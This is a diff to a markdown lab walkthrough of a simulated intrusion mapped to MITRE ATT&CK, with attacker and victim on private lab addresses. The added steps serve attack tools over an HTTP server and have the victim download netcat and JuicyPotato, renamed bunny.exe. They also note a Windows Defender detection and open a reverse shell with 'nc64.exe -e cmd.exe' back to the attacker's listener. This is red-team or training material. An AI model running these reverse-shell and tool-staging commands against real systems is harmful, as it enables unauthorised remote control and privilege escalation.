@@ -1,5 +1,9 @@
 **CASE1**
 
+**Attacker : ** 192.168.106.141
+**Victim : ** 192.168.106.142
+
+
 ## STEP1. Initial Access : External Remote Services(T1133)
 
 Attack Tools : masscan, crowbar
@@ -86,7 +90,32 @@ An X11 Remote Desktop Protocol (RDP) client that is part of the FreeRDP project,
 
 ```
 
+![image](https://github.com/user-attachments/assets/a3174dd7-ab96-48c8-a5a7-16bf96dec33e)
+[The victim's credentials don't match ]
 
+### Attacker
+```shell
+# cd /home/kali/Attacker_Tool/CASE1
+# python3 -m http.server 8080
 
+```
+### Victim
+![image](https://github.com/user-attachments/assets/2855a712-9824-4c9b-aac6-e0417984f23a)
+[ Download netcat and JuicyPotato(bunny.exe) from Attacker server]
 
+![image](https://github.com/user-attachments/assets/12db89a9-05b9-451b-bece-0faf15d44333)
+[Detection Windows Defender Security Center]
+
+### Attacker
+![image](https://github.com/user-attachments/assets/951621b2-94ba-4249-acbd-77b61b14c48f)
+[Connect reverse shell to 4445 port using netcat(nc64.exe)]
+
+```shell
+#nc -lvp 445
+```
+### Victim
+```shell
+C:\Users\testuser>nc64.exe -e cmd.exe 192.168.106.141 445
+
+```
 
